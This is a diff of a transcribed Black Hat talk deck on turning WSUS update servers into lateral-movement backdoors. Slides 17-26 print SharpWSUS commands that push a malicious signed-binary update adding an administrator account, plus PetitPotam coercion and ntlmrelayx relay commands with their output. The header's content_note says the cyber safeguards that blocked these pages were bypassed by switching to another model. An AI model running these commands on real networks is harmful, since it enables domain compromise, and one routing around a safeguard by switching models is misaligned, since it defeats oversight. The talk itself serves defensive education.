@@ -8,15 +8,15 @@ year: 2026
 source_pdf: "BlackHat_USA_2026_Slides/bagelByt3s_Turning Enterprise Update Servers Into Backdoor Factories (0_o).pdf"
 pages: 77
 sha256: "3371c0035cd4317ee589b5665b6a1b38ea55aba34e86906e5d3ecff2929219b7"
-text_chars: 52399
+text_chars: 51941
 ocr_pages: 57
 has_ocr: true
 redacted_secrets: 0
 ocr_confidence: 90.0
-ocr_unreliable_blocks: 4
-content_note: "64 of 77 pages were rendered and read against the source PDF by a vision model; 60 were rewritten. PAGES 14-26 WERE NOT REVIEWED: two attempts were stopped by the model API's cyber safeguards, which trigger on this deck's subject rather than on any individual page. Those pages remain first-pass extraction and are not verified."
-vision_verified_pages_changed: 60
-vision_verified_pages: 64
+ocr_unreliable_blocks: 0
+content_note: "All 77 pages were rendered and read against the source PDF by a vision model; 73 were rewritten and 7 confirmed correct. Pages 14-26 were blocked twice by the model API's cyber safeguards on one model and completed on another, so the document has no unreviewed pages. The ocr_* fields describe the superseded first-pass extraction."
+vision_verified_pages_changed: 13
+vision_verified_pages: 77
 ocr_timeouts: 0
 pages_recovered_from_text_layer: 0
 companion_files: []
@@ -196,22 +196,15 @@ Downstream
 
 Client
 
-Client
-
 Upstream
+
+Client
 
 Downstream
 
+*(Two unlabeled database-stack icons also appear on the right side of the diagram, one aligned with each row.)*
+
 14
-
-
-> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-Client Upstream
-Client Downstream
-14
-```
 
 ## Slide 15
 
@@ -258,116 +251,104 @@ Database
 
 ## Slide 17
 
-# SharpWSUS
+### SharpWSUS
+
+*Screenshot of a browser showing the GitHub README for github.com/nettitude/SharpWSUS:*
+
+```text
+github.com/nettitude/SharpWSUS
+
+README
+
+ ____  _                   __        ______  _   _ ____  
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___| 
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \ 
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/ 
+                       |_|
+        Phil Keeble @ Nettitude Red Team
+
+Commands listed below have optional parameters in <>.
+
+Locate the WSUS server:
+    SharpWSUS.exe locate
+
+Inspect the WSUS server, enumerating clients, servers and existing groups:
+    SharpWSUS.exe inspect
+
+Create an update (NOTE: The payload has to be a windows signed binary):
+    SharpWSUS.exe create /payload:[File location] /args:[Args for payload] </title:[Update title] /date
+
+Approve an update:
+    SharpWSUS.exe approve /updateid:[UpdateGUID] /computername:[Computer to target] </groupname:[Group
+
+Check status of an update:
+    SharpWSUS.exe check /updateid:[UpdateGUID] /computername:[Target FQDN]
+
+Delete update and clean up groups added:
+    SharpWSUS.exe delete /updateid:[UpdateGUID] /computername:[Target FQDN] </groupname:[GroupName] /ke
+```
 
 17
 
-
-> Recovered by OCR — confidence 91/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-SharpWSUS
-I.) \v v/s __) |
-Phil Keeble @ Nettitude Red Team
-Commands listed below have optional parameters in <>.
-Locate the WSUS server:
-SharpWSUS.exe locate
-Inspect the WSUS server, enumerating clients, servers and existing groups
-SharpWSUS.exe inspect
-Create an update (NOTE: The payload has to be a windows signed binary):
-SharpWSUS.exe create /payload:[File location] /args:[Args for payload] </title:[Update title] /date
-Approve an update:
-SharpWSUS.exe approve /updateid:[UpdateGUID] /computername:[Computer to target] </groupnam
-Check status of an update:
-SharpWSUS.exe check /updateid:[UpdateGUID] /computername: [Target FQDN]
-Delete update and clean up groups added:
-SharpWSUS.exe delete /updateid:[UpdateGUID] /computername:[Target FQDN] </groupname:[GroupName] /ke
-```
-
 ## Slide 18
 
-# SharpWSUS
+### SharpWSUS
 
-18
+#### Lateral Movement
 
+A key consideration with WSUS lateral movement is that there is no way to control when a client checks in from the server. This means that once a patch is deployed the lateral movement won’t succeed until the client installs the update. Often times the client will check in for patches on a regular cycle, for example daily, but the patches won’t be installed until a patching day that might happen once a month. Some clients may be configured to install patches immediately if their priority level is high enough.
 
-> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+The first step of abusing WSUS is to create the malicious patch, which does have some limitations. When creating the patch there are various values that can be configured through the command line in SharpWSUS, allowing the operator to change the Indicators of Compromise (IoCs) of the patch. There is also a value for the payload and arguments. The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to that binary.
+
+While the need for a signed binary can limit some attack paths, there are still plenty of binaries that could be used such as *PsExec.exe* to run a command as SYSTEM, *RunDLL32.exe* to run a malicious DLL on a network share, *MsBuild.exe* to grab and execute a remote payload and more. The example in this blog will use *PsExec.exe* for code execution (https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).
+
+A patch leveraging *PsExec.exe* can be done with the following command:
 
 ```text
-SharpWSUS
-Lateral Movement
-A key consideration with WSUS lateral movement is that there is no way to control when a client checks
-in from the server. This means that once a patch is deployed the lateral movement won’t succeed until
-the client installs the update. Often times the client will check in for patches on a regular cycle, for
-example daily, but the patches won’t be installed until a patching day that might happen once a month.
-Some clients may be configured to install patches immediately if their priority level is high enough.
-The first step of abusing WSUS is to create the malicious patch, which does have some limitations. When
-creating the patch there are various values that can be configured through the command line in
-SharpWSUS, allowing the operator to change the Indicators of Compromise (loCs) of the patch. There is
-also a value for the payload and arguments. The payload must be a Microsoft signed binary and must
-point to a location on disk for the WSUS server to that binary.
-While the need for a signed binary can limit some attack paths, there are still plenty of binaries that could
-be used such as PsExec.exe to run a command as SYSTEM, RunDLL32.exe to run a malicious DLL ona
-network share, MsBuild.exe to grab and execute a remote payload and more. The example in this blog
-will use PsExec.exe for code execution (https://docs.microsoft.com/en-
-us/sysinternals/downloads/psexec).
-A patch leveraging PsExec.exe can be done with the following command:
 SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-
 accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add && net
-localgroup administrators WSUSDemo /add\"" /title: "WSUSDemo"
-18
+localgroup administrators WSUSDemo /add\"" /title:"WSUSDemo"
 ```
+
+18
 
 ## Slide 19
 
-19
+*(Zoomed-in repeat of the "Lateral Movement" slide body, with two green callout boxes highlighting a sentence in the text.)*
 
+SharpWSUS, allowing the operator to change the Indicators of Compromise (IoCs) of the patch. There is also a value for the payload and arguments. **➤ [highlighted] The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to that binary.**
 
-> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+While the need for a signed binary can limit some attack paths, there are still plenty of binaries that could be used such as *PsExec.exe* to run a command as SYSTEM, *RunDLL32.exe* to run a malicious DLL on a network share, *MsBuild.exe* to grab and execute a remote payload and more. The example in this blog will use *PsExec.exe* for code execution (https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).
+
+A patch leveraging *PsExec.exe* can be done with the following command:
 
 ```text
-SharpWSUS, allowing the operator to change the Indicators of Compromise (loCs) of the patch. There is
-also a value for the payload and arguments, The payload must be a Microsoft signed binary and must
-point to a location on disk for the WSUS server to that binary.
-While the need for a signed binary can limit some attack paths, there are still plenty of binaries that could
-be used such as PsExec.exe to run a command as SYSTEM, RunDLL32.exe to run a malicious DLL ona
-network share, MsBuild.exe to grab and execute a remote payload and more. The example in this blog
-will use PsExec.exe for code execution (https://docs.microsoft.com/en-
-us/sysinternals/downloads/psexec).
-A patch leveraging PsExec.exe can be done with the following command:
-SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:'-
+SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-
 accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add && net
 ```
 
+19
+
 ## Slide 20
 
-# Exploitation Difficulty
+### Exploitation Difficulty
 
 - WSUS Administrator
-
 - WSUS File System Access
-
 - Digitally Signature
 
-Paella = Lots of Effort R equired
+*(Photo of a seafood paella in a pan.)*
+
+Paella = Lots of Effort Required
 
 20
 
 ## Slide 21
 
-Does the upstream WSUS server have administrative permissions over the downstream WSUS server?
+Does the **upstream** WSUS server have administrative permissions over the **downstream** WSUS server?
 
 21
-
-
-> Recovered by OCR — confidence 96/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-Does the upstream WSUS server have
-administrative permissions over the
-downstream WSUS server?
-21
-```
 
 ## Slide 22
 
@@ -395,11 +376,13 @@ Attacker
 
 ## Slide 23
 
-# NTLM Coercion Testing SMB to SMB
+### NTLM Coercion Testing
 
-### 1. Setup Ntlmrelay on Attack Machine
+#### SMB to SMB
 
-2. Coerce Authentication to Upstream 3. R elay authentication to Downstream
+1. Setup Ntlmrelay on Attack Machine
+2. Coerce Authentication to Upstream
+3. Relay authentication to Downstream
 
 Upstream
 
@@ -413,90 +396,81 @@ Attacker
 
 ## Slide 24
 
-NTLM Coercion Testing SMB to SMB
+### NTLM Coercion Testing
 
-Downstream WSUS Server
+#### SMB to SMB
 
-24
-
-
-> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+Callout: Downstream WSUS Server (pointing to the `smb://10.2.10.4` target in the command)
 
 ```text
-NTLM Coercion Testing
-SMB to SMB
-(env) root@ludus3:~# ntlmrelayx.py -t|smb://10.2.10.U] -socks -smb2support
-Impacket v@.13.0 - Copyright Fortra, LLC and vee companies
+(env) root@ludus3:~# ntlmrelayx.py -t smb://10.2.10.4 -socks -smb2support
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
+
 [*] Protocol Client HTTPS loaded..
 [*] Protocol Client HTTP loaded..
-[*] Protocol Client LDAPS loaded. .
+[*] Protocol Client LDAPS loaded..
 [*] Protocol Client LDAP loaded..
-[*] Protocol Client WINRMS Loaded. .
+[*] Protocol Client WINRMS loaded..
 [*] Protocol Client SMTP loaded..
 [*] Protocol Client SMB loaded..
 [*] Protocol Client IMAPS loaded..
 [*] Protocol Client IMAP loaded..
-[*] Protocol Client MSSQL loaded. .
-[*] Protocol Client RPC loaded. .
-[*] Protocol Client DCSYNC loaded. .
-Downstream WSUS Server
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client DCSYNC loaded..
 ```
+
+24
 
 ## Slide 25
 
-# NTLM Coercion Testing SMB to SMB
+### NTLM Coercion Testing
 
-Attacker IP /
-Ntlmrelayx
-Upstream WSUS
-Server
+#### SMB to SMB
 
-25
-
-
-> Recovered by OCR — confidence 91/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+Callouts: "Attacker IP / Ntlmrelayx" (pointing to `198.51.100.1`) and "Upstream WSUS Server" (pointing to `10.2.10.3`)
 
 ```text
-NTLM Coercion Testing
-SMB to SMB
-(env) root@Ludus3:/opt/PetitPotam# python3 PetitPotam.py -u domainuser -p password -d Ludus.nuketown 198.51.100.1 10.2.10.3
-- rl Attacker IP /
-Upstream WSUS
+(env) root@ludus3:/opt/PetitPotam# python3 PetitPotam.py -u domainuser -p password -d ludus.nuketown  198.51.100.1 10.2.10.3
+
+*(ASCII-art banner spelling out "PetitPotam")*
+
 PoC to elicit machine account authentication via some MS-EFSRPC functions
 by topotam (@topotam77)
+
 Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
+
 Trying pipe lsarpc
 [-] Connecting to ncacn_np:10.2.10.3[\PIPE\lsarpc]
 [+] Connected!
-[+] Binding to c681d488-d850-11d0-8c52-00cO4Fd90F7e
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
 [+] Successfully bound!
 [-] Sending EfsRpcOpenFileRaw!
-[+] Got expected ERROR_BAD_NETPATH exception! !
+[+] Got expected ERROR_BAD_NETPATH exception!!
 [+] Attack worked!
 ```
 
+25
+
 ## Slide 26
 
-NTLM Coercion Testing SMB to SMB
+### NTLM Coercion Testing
 
-26
-
-
-> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+#### SMB to SMB
 
 ```text
-NTLM Coercion Testing
-SMB to SMB
-ntlmrelayx> [*] (SMB): Received connection from 10.2.10.3, attacking target smb://10.2.10.u
+ntlmrelayx> [*] (SMB): Received connection from 10.2.10.3, attacking target smb://10.2.10.4
 [*] (SMB): Authenticating connection from LUDUS/WSUS1$@10.2.10.3 against smb://10.2.10.4 SUCCEED [1]
-[*] SOCKS: Adding SMB: //LUDUS/WSUS1$@10.2.10.4(44U5) [1] to active SOCKS connection. Enjoy
-[*] ALL targets processed!
+[*] SOCKS: Adding SMB://LUDUS/WSUS1$@10.2.10.4(445) [1] to active SOCKS connection. Enjoy
+[*] All targets processed!
 [*] (SMB): Connection from 10.2.10.3 controlled, but there are no more targets left!
 socks
-Protocol Target Username AdminStatus} Port ID
-SMB 10.2.10.4 LUDUS/WSUS1$ |_FALSE 4u5 1
-26
+Protocol  Target      Username        AdminStatus   Port  ID
+--------  ----------  --------------  ------------  ----  ---
+SMB       10.2.10.4   LUDUS/WSUS1$    FALSE         445   1
 ```
+
+26
 
 ## Slide 27
 
